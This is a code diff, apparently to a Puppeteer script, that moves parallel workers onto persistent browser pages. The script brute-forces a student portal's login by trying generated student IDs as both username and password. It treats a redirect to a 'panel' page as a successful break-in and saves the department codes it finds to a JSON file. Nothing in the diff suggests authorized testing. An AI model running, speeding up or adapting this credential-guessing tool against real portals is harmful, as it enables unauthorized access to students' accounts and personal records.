@@ -26,35 +26,9 @@ const resultsFilePath = "found_departments.json";
 
     // A Set is faster for checking if a department was already processed
     const checkedDepts = new Set(foundDepartments.map(d => d.department));
-
+    
     /**
-     * The main worker function. It takes a single student ID and checks it.
-     * @param {string} userId - The student ID to check (e.g., 'CSE230120001').
-     * @returns {Promise<boolean>} - True if the ID is valid, false otherwise.
-     */
-    const checkId = async (userId) => {
-        const page = await browser.newPage();
-        await page.setDefaultNavigationTimeout(15000);
-        try {
-            await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
-            await page.type("#username", userId);
-            await page.type("#password", userId);
-            await Promise.all([
-                page.click("button[type=submit]"),
-                page.waitForNavigation({ waitUntil: "domcontentloaded" })
-            ]);
-            return page.url().includes("panel");
-        } catch (error) {
-            return false; // Any error (timeout, etc.) means the ID is invalid
-        } finally {
-            if (!page.isClosed()) {
-                await page.close();
-            }
-        }
-    };
-
-    /**
-     * Creates and runs a parallel search for a given department.
+     * Creates and runs a parallel search for a given department using persistent pages.
      * @param {string} department - The three-letter department code.
      * @returns {Promise<boolean>} - True if the department was found, false otherwise.
      */
@@ -63,7 +37,7 @@ const resultsFilePath = "found_departments.json";
             console.log(`⏭️  Skipping already found department: ${department}`);
             return false;
         }
-        console.log(`\n🔎 Searching department: ${department} with ${MAX_CONCURRENT_CHECKS} parallel workers...`);
+        console.log(`\n🔎 Searching department: ${department} with ${MAX_CONCURRENT_CHECKS} persistent workers...`);
 
         // 1. Create the queue of all tasks (student IDs) for this department
         const taskQueue = [];
@@ -78,33 +52,53 @@ const resultsFilePath = "found_departments.json";
 
         let departmentFound = false;
 
-        // 2. Create a pool of worker promises
+        // 2. Create a pool of worker promises, each with its own persistent page
         const workerPromises = [];
         for (let i = 0; i < MAX_CONCURRENT_CHECKS; i++) {
-            const workerId = i + 1; // Assign a stable ID to each worker
+            const workerId = i + 1;
             workerPromises.push((async () => {
-                // Each worker will process tasks from the queue until it's empty or a discovery is made
+                const page = await browser.newPage(); // Create one page per worker
+                await page.setDefaultNavigationTimeout(15000);
+
+                // Each worker will process tasks from the queue
                 while (taskQueue.length > 0 && !departmentFound) {
-                    const userId = taskQueue.shift(); // Atomically get the next task
+                    const userId = taskQueue.shift();
                     if (!userId) continue;
 
-                    console.log(`    - [Worker ${workerId}] Checking ID: ${userId}`); // Use stable workerId for logging
-                    const isSuccess = await checkId(userId);
-
-                    if (isSuccess && !departmentFound) {
-                        departmentFound = true; // Signal other workers to stop processing more tasks
-                        console.log(`\n🎉 SUCCESS! Department '${department}' is valid (discovered with ID: ${userId})`);
+                    console.log(`    - [Worker ${workerId}] Checking ID: ${userId}`);
+                    
+                    try {
+                        await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
+                        await page.type("#username", userId);
+                        await page.type("#password", userId);
+                        await Promise.all([
+                            page.click("button[type=submit]"),
+                            page.waitForNavigation({ waitUntil: "domcontentloaded" })
+                        ]);
                         
-                        foundDepartments.push({ department });
-                        checkedDepts.add(department);
-                        fsModule.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
-                        console.log(`💾 Saved to ${resultsFilePath}. Stopping search for this department.\n`);
+                        const isSuccess = page.url().includes("panel");
+
+                        if (isSuccess && !departmentFound) {
+                            departmentFound = true;
+                            console.log(`\n🎉 SUCCESS! Department '${department}' is valid (discovered with ID: ${userId})`);
+                            
+                            foundDepartments.push({ department });
+                            checkedDepts.add(department);
+                            fsModule.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
+                            console.log(`💾 Saved to ${resultsFilePath}. Stopping search for this department.\n`);
+                        }
+                    } catch (error) {
+                        // Ignore errors, just means this ID failed. The worker will continue.
                     }
+                }
+                // When the worker is done, close its dedicated page
+                if (!page.isClosed()) {
+                    await page.close();
                 }
             })());
         }
 
-        // 3. Wait for all workers to complete their current tasks
+        // 3. Wait for all workers to complete their tasks for this department
         await Promise.all(workerPromises);
 
         if (!departmentFound) {
